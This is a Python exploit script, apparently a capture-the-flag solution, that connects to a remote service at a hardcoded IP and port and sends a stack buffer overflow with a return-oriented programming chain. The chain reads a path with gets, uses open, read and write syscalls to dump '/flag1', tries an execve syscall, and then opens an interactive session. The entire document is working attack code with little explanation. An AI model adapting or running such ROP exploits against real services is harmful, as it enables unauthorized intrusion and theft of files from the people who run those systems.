from ptrlib import *
import time

elf = ELF("./app")
#sock = Process("./app")
sock = Socket("34.82.101.212", 10011)
rop_pop_rdi = 0x00400686
rop_pop_rsi = 0x00410083
rop_pop_rdx = 0x0044b9b6
rop_pop_rax = 0x00415234
rop_syscall = 0x00474a05
addr_path = elf.section('.bss') + 0x100
addr_flag = elf.section('.bss') + 0x200

payload = b'A' * 0x108
payload += p64(rop_pop_rdi)
payload += p64(addr_path)
payload += p64(elf.symbol('gets')) # gets(path)
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdi)
payload += p64(addr_path)
payload += p64(rop_pop_rax)
payload += p64(2)
payload += p64(rop_syscall) # open(path, O_RDNLY)
payload += p64(rop_pop_rdx)
payload += p64(0x30)
payload += p64(rop_pop_rsi)
payload += p64(addr_flag)
payload += p64(rop_pop_rdi)
payload += p64(3)
payload += p64(rop_pop_rax)
payload += p64(0)
payload += p64(rop_syscall) # read(fd, flag, 0x40)
payload += p64(rop_pop_rdx)
payload += p64(0x30)
payload += p64(rop_pop_rsi)
payload += p64(addr_flag)
payload += p64(rop_pop_rdi)
payload += p64(1)
payload += p64(rop_pop_rax)
payload += p64(1)
payload += p64(rop_syscall) # write(1, flag, 0x40)


payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
sock.sendline(payload)
time.sleep(0.1)
sock.sendline("/flag1")
#sock.sendline("/flag")

sock.interactive()
